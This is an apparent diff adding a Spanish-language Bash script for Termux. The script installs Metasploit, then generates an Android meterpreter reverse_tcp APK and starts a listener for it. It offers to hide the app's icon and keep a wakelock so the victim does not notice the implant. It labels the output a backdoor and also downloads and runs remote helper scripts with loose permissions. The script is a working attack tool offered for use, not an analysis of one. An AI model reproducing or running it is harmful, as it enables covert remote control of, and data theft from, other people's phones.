@@ -1,0 +1,354 @@
+#!/bin/bash
+#
+#Variables
+PWD=$(pwd)
+ARCH=$(uname -m)
+MSFVENOM=$(command -v msfvenom)
+VERSION="6.0.27"
+WORK="/data/data/com.termux/files/home"
+USR="/data/data/com.termux/files/usr"
+MSF="/data/data/com.termux/files/usr/opt/metasploit-framework"
+#
+#Colores
+g="${b}\033[1;30m"
+b="\033[0m"
+b1="$b\033[1;37m"
+r="${b}\033[1;31m"
+r1="${b}\033[31m"
+A="${b}\033[1;34m"
+A1="${b}\033[34m"
+ac="${b}\e[1;36m"
+ac1="${b}\e[36m"
+v="${b}\033[1;32m"
+v1="${b}\033[32m"
+m="$b\033[1;35m"
+m1="$b\033[35m"
+a="$b\033[1;33m"
+a1="$b\033[33m"
+cy="$b\033[38;2;23;147;209m"
+trap finished INT
+#
+#funcion finished
+finished() {
+    sleep 0.2
+    printf "\n"
+    printf "\n"
+    printf "${v1}[${b}+${v1}]${b} Finished\n"
+    printf "${v1}[${b}+${v1}]${b} Created by Anonymous Zpt\n"
+    printf "${v1}[${b}+${v1}]${b} Gracias por usar mi herramienta\n"
+    printf "${v1}[${b}+${v1}]${b} servicio de ayuda https://t.me/Anonymous_Zpt$b\n"
+    printf "\n"
+    sleep 0.0
+    exit
+}
+#
+#funcion banner
+banner() {
+    printf "$(clear)\n"
+    printf "${r}  ___ ___${b1}           __                             __           __   __\n"
+    printf "${r} |   Y   |${b1} .-----. |  |_  .---.-. .-----. .-----. |  | .-----. |__| |  |_\n"
+    printf "${r} |.      |${b1} |  -__| |   _| |  _  | |__ --| |  _  | |  | |  _  | |  | |   _|\n"
+    printf "${r} |. \_/  |${b1} |_____| |____| |___._| |_____| |   __| |__| |_____| |__| |____|\n"
+    printf "${r} |:  |   |${b1}                                |__|\n"
+    printf "${r} |___|___|${b}\n"
+}
+#
+#funcion payload
+payload() {
+    banner
+    if [ "${MSFVENOM}" == "" ]; then
+        printf "\n${v1} Debe Instalar Metasploit\n"
+        printf "\n"
+        printf "${A1} [${b}01${A1}]${b} Instalar\n"
+        printf "\n"
+        printf "${A1} [${b}02${A1}]${b} No Instalar\n"
+        printf "\n"
+        printf "${v1}|-${r1}M ${b}Framework${v1}->${b} "
+        read msfvenom
+        case $msfvenom in
+        01|1)
+            rta_menu
+        ;;
+        02|2)
+            sleep 0.2
+            printf "\n"
+            printf "${v1}[${b}+${v1}]${b} Finished\n"
+            printf "${v1}[${b}+${v1}]${b} Created by Anonymous Zpt\n"
+            printf "${v1}[${b}+${v1}]${b} Gracias por usar mi herramienta\n"
+            printf "${v1}[${b}+${v1}]${b} servicio de ayuda https://t.me/Anonymous_Zpt\n"
+            printf "${v1}[${b}+${v1}]${b} Puede volver a ejecuta el script: ${r1}./M-framework${b}\n"
+            printf "\n"
+            sleep 0.0
+            exit
+        ;;
+        *)
+            echo -e "${r1}[—] OPCION INVALIDA..!$b"
+            sleep 1
+            payload
+        esac
+    fi
+#
+#funcion nombre
+nombre() {
+    printf "\n"
+    printf "${b1}Defaul:${b} MainActivity\n"
+    printf "${v}Digite el$r1 Nombre$v de apk${v}\n└═>$b "
+    read nombre
+    if [ "$nombre" == "" ]; then
+        nombre="Main Activity"
+    fi
+    sleep 0.5
+}
+#
+#funcion ruta
+ruta() {
+    printf "\n"
+    printf "${b1}Defaul:${b} /sdcard\n"
+    printf "${v}Digite la$r1 ruta${v}\n└═>$b "
+    read ruta
+    case $ruta in
+        "")
+            ruta="/sdcard"
+        ;;
+        *)
+            if [ -f $ruta ]; then
+            echo -e "${r1}[—] Ruta No Existe$b"
+            sleep 1
+            ruta
+            fi
+    esac
+    sleep 0.5
+}
+#
+#funcion host
+host() {
+    printf "\n"
+    printf "${b1}Ejemplo:${b} Jose-Zpt-35098.portmap.io\n"
+    printf "${v}Digite su$r1 host${v}\n└═>$b "
+    read host
+    if [ "$host" == "" ]; then
+        echo -e "${r1}[—] host Necesario..!$b"
+        sleep 1
+        host
+    fi
+    sleep 0.5
+}
+#
+#funcion port
+port() {
+    if [ $(echo "$host" |grep -o ".portmap.io") ]; then
+        PORT=$(echo "$host" |grep -o "[0-9].*" | sed 's/.portmap.io//')
+        test="${b1}Defaul:${b} ${PORT}\n"
+        PORT_NULO="0"
+    elif [ "$host" == "127.0.0.1" ]; then
+        PORT="4444"
+        test="${b1}Defaul:${b} ${PORT}\n"
+        PORT_NULO="1"
+    else
+        test="${b1}Ejemplo:${b} 35098\n"
+    fi
+    printf "\n"
+    printf "${test}"
+    printf "${v}Digite su$r1 port${v}\n└═>$b "
+    read port
+    if [ "$port" == "" ]; then
+        if [ "${PORT_NULO}" == "0" ]; then
+            port="${PORT}"
+        elif [ "${PORT_NULO}" == "1" ]; then
+            port="${PORT}"
+        else
+            echo -e "${r1}[—] port Necesario..!$b"
+            sleep 1
+            port
+        fi
+    fi
+    sleep 0.5
+}
+#
+#funcion puerto
+puerto() {
+    if [ "${PORT_NULO}" == "1" ]; then
+        puerto="${port}"
+    else
+        printf "\n"
+        printf "${b1}Defaul:${b} 8080\n"
+        printf "${v}Digite su$r1 puerto local${v}\n└═>$b "
+        read puerto
+        if [ "$puerto" == "" ]; then
+            puerto="8080"
+        fi
+        sleep 0.5
+     fi
+}
+nombre
+ruta
+host
+port
+puerto
+#
+#funcion reemplazo
+reemplazo() {
+    host=$(echo -e "$host" |sed 's/ //')
+    port=$(echo -e "$port" |sed 's/ //')
+    ruta=$(echo -e "$ruta" |sed 's/ //')
+    nombre=$(echo -e "$nombre" |sed 's/ //')
+}
+#
+#funcion icono
+icono() {
+    printf "\n"
+    printf "${v1} Ocultar payload automaticamente\n"
+    printf "${b} Defaul: No\n"
+    printf "\n"
+    printf "${A1} [${b}01${A1}]${b} Si\n"
+    printf "${A1} [${b}02${A1}]${b} No\n"
+    printf "\n"
+    printf "${v1}|-${r1}M ${b}Framework${v1}->${b} "
+    read icono
+    case $icono in
+    01|1)
+        printf "${v}[${b}+${v]}${b} Generando Payload...${b}\n"
+        reemplazo
+        msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port AndroidHideAppIcon=true AndroidMeterpreterDebug=true AndroidWakelock=true -o $ruta/$nombre.apk
+    ;;
+    02|2|"")
+        printf "${v}[${b}+${v}]${b} Generando Payload...${b}\n"
+        reemplazo
+        msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o $ruta/$nombre.apk
+    ;;
+    *)
+        printf "${r1}[—] OPCION INVALIDA..!${b}"
+        sleep 1
+        printf "\n"
+        icono
+    esac
+}
+icono
+rm -r msf
+printf 'msfconsole -q -x "use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set lhost ' >> msf
+printf "$host;set lport $puerto;exploit" >> msf
+printf '"' >> msf
+chmod 777 msf
+msfconsole -q -x "use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set lhost $host;set lport $puerto;exploit"
+}
+menu() {
+    banner
+    printf "\n"
+    printf "${A1} [${b}01${A1}]${b} Instalar Metasploit Framework\n"
+    printf "\n"
+    printf "${A1} [${b}02${A1}]${b} Crear Payload${ac1}(Backdoor)\n"
+    printf "\n"
+    printf "${A1} [${b}03${A1}]${b} Contacto${ac1}(Telegram)\n"
+    printf "\n"
+    printf "${A1} [${b}04${A1}]${b} Exit${ac1}(Salir)\n"
+    printf "\n"
+}
+rta_menu() {
+    menu
+    printf "${v1}|-${r1}M ${b}Framework${v1}->${b} "
+    read rta_menu
+    case $rta_menu in
+        01|1)
+            if [ -d ${WORK}/storage ]; then
+                PWD=$(pwd)
+            else
+                termux-setup-storage
+            fi
+            if [ -d ${USR}/include/openssl ]; then
+                PWD=$(pwd)
+            else
+                pkg update -y && pkg upgrade -y
+            fi
+            if [ -d ${USR}/opt ]; then
+                PWD=$(pwd)
+            else
+                mkdir -p ${USR}/opt
+            fi
+            if [ -x ${USR}/bin/git ]; then
+                PWD=$(pwd)
+            else
+                pkg install git -y
+            fi
+            if [ -x ${USR}/bin/ruby ]; then
+                pkg uninstall ruby -y
+            fi
+            if [ -x ${USR}/bin/curl ]; then
+                PWD=$(pwd)
+            else
+                pkg install curl -y
+            fi
+            if [ -x ${USR}/bin/wget ]; then
+                PWD=$(pwd)
+            else
+                pkg install wget -y
+            fi
+            if [ -d ${WORK}/metasploit-framework ]; then
+                rm -rf ${WORK}/metasploit-framework
+            fi
+            if [ -d ${MSF} ]; then
+                rm -rf ${MSF}
+            fi
+            if [ -x ${USR}/bin/msfconsole ]; then
+                rm ${USR}/bin/msfconsole
+            fi
+            if [ -x ${USR}/bin/msfvenom ]; then
+                rm ${USR}/bin/msfvenom
+            fi
+            if [ -x ${USR}/bin/msfdb ]; then
+                rm ${USR}/bin/msfdb
+            fi
+            #Arquitectura
+            if [ "${ARCH}" == "aarch64" ]; then
+                RUBY="ruby_aarch64.deb"
+            elif [ "${ARCH}" == "i686" ]; then
+                RUBY="ruby_i686.deb"
+            elif [ "${ARCH}" == "x86_64" ]; then
+                RUBY="ruby_x86_64.deb"
+            else
+                RUBY="ruby_arm.deb"
+            fi
+            #Instalando Metasploit
+            cp ${PWD}/ruby/${RUBY} ${PWD}/ruby.deb
+            pkg install -y libiconv zlib autoconf bison clang coreutils findutils apr apr-util libffi libgmp libpcap postgresql readline libsqlite openssl libtool libxml2 libxslt ncurses pkg-config make libgrpc termux-tools ncurses-utils ncurses unzip zip tar termux-elf-cleaner
+            cd ${USR}/opt
+            ln -sf ${USR}/include/libxml2/libxml ${USR}/include
+            apt-mark unhold ruby
+            curl -LO https://github.com/rapid7/metasploit-framework/archive/${VERSION}.tar.gz
+            tar -xf ${VERSION}.tar.gz
+            mv ${MSF}-${VERSION} ${MSF}
+            mv ${WORK}/M-framework/ruby.deb ${USR}/opt
+            apt install -y ./ruby.deb
+            apt-mark hold ruby
+            cd ${MSF}
+            bundle config build.nokogiri --use-system-libraries
+            bundle update
+            curl -LO https://raw.githubusercontent.com/Anonymous-Zpt/M-framework/master/fix-ruby-bigdecimal.sh.txt
+            bash fix-ruby-bigdecimal.sh.txt
+            mkdir -p ${USR}/var/lib/postgresql
+            initdb ${USR}/var/lib/postgresql
+            rm ${USR}/opt/${VERSION}.tar.gz
+            rm ${USR}/opt/ruby.deb
+            cd ${USR}/bin
+            curl -LO https://raw.githubusercontent.com/Anonymous-Zpt/M-framework/master/execute/msfconsole
+            curl -LO https://raw.githubusercontent.com/Anonymous-Zpt/M-framework/master/execute/msfvenom
+            curl -LO https://raw.githubusercontent.com/Anonymous-Zpt/M-framework/master/execute/msfdb
+            chmod 777 msfconsole msfvenom msfdb
+            printf "\n[*] Metasploit Framework installation finished.${b}\n"
+        ;;
+        02|2)
+            payload
+        ;;
+        03|3)
+            termux-open https://t.me/Anonymous_Zpt &>> /dev/null
+            printf "\n"
+        ;;
+        04|4)
+            finished
+        ;;
+        *)
+            echo -e "${r1}[—] OPCION INVALIDA..!${b}"
+            sleep 1
+            rta_menu
+    esac
+}
+rta_menu
